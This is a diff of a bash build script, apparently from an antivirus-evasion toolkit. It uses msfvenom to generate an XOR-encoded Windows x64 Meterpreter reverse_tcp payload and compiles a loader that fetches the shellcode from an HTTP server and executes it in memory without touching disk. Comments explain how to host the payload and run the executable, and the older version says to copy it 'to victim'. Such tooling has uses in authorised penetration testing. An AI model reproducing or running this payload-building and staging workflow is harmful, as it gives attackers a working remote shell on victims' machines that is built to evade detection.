@@ -1,10 +1,19 @@
 #!/bin/bash 
 # example script for building executables with 64bit payload
 
+# The generated msf shellcode file needs to be hosted on a HTTP server
+# Call the executable like:
+# output.exe http://yourserver/thepayload.bin
+# The executable downloads the shellcode into memory (no file is dropped on disk) and executes it.
+
+
 # include script containing the compiler var $win64_compiler
 # you can edit the compiler in build/global_win64.sh
 # or enter $win64_compiler="mycompiler" here
 . build/global_win64.sh
+
+# import feature construction interface
+. build/feature_construction.sh
 
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
@@ -14,13 +23,30 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x64/xor -b '\x00' -f raw --platform Windows > /var/www/html/sc.bin
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x64/xor -b '\x00' -f raw --platform Windows > output/thepayload.bin
 
-# call make_avet, compile 
-./make_avet -X -d sock 
-$win64_compiler -o pwn64.exe avet.c  -lwsock32 -lWs2_32
+# set shellcode source
+set_shellcode_source download_socket
+
+# set decoder and key source
+set_decoder none
+set_key_source none
+
+# set shellcode binding technique
+set_shellcode_binding exec_shellcode64
+
+# enable debug output
+enable_debug_print
+
+# compile
+$win64_compiler -o output/output.exe source/avet.c -lwsock32 -lWs2_32
+strip output/output.exe
 
 # cleanup
-echo "" > defs.h
+cleanup_techniques
 
-# now copy pwn64.exe to victim and exec like: pwn http://yourserver/sc.bin
+
+# The generated msf shellcode file needs to be hosted on a HTTP server
+# Call the executable like:
+# output.exe http://yourserver/thepayload.bin
+# The executable downloads the shellcode into memory (no file is dropped on disk) and executes it.
